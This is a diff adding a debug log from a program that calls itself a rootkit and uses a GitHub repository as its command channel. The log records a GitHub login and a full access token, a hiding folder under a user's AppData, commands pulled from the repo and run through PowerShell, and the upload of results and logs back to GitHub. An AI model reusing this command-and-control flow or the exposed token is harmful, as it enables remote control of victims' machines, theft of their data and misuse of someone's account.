@@ -1,0 +1,29 @@
+Mon Jul 26 17:23:31 2021. Initialisation of the log file.
+
+DEBUG: Mon Jul 26 17:23:31 2021: GithubLogin: hidemepls785
+DEBUG: Mon Jul 26 17:23:31 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Mon Jul 26 17:23:31 2021: GihubAccessToken: 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
+DEBUG: Mon Jul 26 17:23:31 2021: Rootkit Name: Preprod02
+DEBUG: Mon Jul 26 17:23:31 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Mon Jul 26 17:23:31 2021: The folder list for random folder is not empty. Its size is: 2432
+DEBUG: Mon Jul 26 17:23:31 2021: The random path choosed for this execution is: C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Photos_8wekyb3d8bbwe\AC\INetCookies\ESE
+DEBUG: Mon Jul 26 17:23:32 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Mon Jul 26 17:23:32 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Mon Jul 26 17:23:32 2021: Success to check the commands with rootkit_path1
+DEBUG: Mon Jul 26 17:23:32 2021: Getting this command from the github repo: keep_going
+DEBUG: Mon Jul 26 17:23:32 2021: Getting this command from the github repo: execute_cmd dir C:\Users\Client
+DEBUG: Mon Jul 26 17:23:32 2021: Start to treat the commands sent by the github repo.
+DEBUG: Mon Jul 26 17:23:32 2021: Command received: keep_going
+DEBUG: Mon Jul 26 17:23:32 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Jul 26 17:23:32 2021: #####################################################
+
+DEBUG: Mon Jul 26 17:23:32 2021: Command received: execute_cmd
+DEBUG: Mon Jul 26 17:23:32 2021: The following command will be executed by powershell: dir C:\Users\Client > C:\Users\sophie\AppData\Local\Packages\Microsoft.Windows.Photos_8wekyb3d8bbwe\AC\INetCookies\ESE\target_command.log1
+DEBUG: Mon Jul 26 17:23:34 2021: Unable to find the file target_command.log. Check your command..
+DEBUG: Mon Jul 26 17:23:34 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Mon Jul 26 17:23:34 2021: #####################################################
+
+DEBUG: Mon Jul 26 17:23:34 2021: Start of GithubCommunication::sendResults
+DEBUG: Mon Jul 26 17:23:35 2021: The results was uploaded on the github repo
+DEBUG: Mon Jul 26 17:23:35 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Mon Jul 26 17:23:35 2021: Start of GithubCommunication::sendLogs
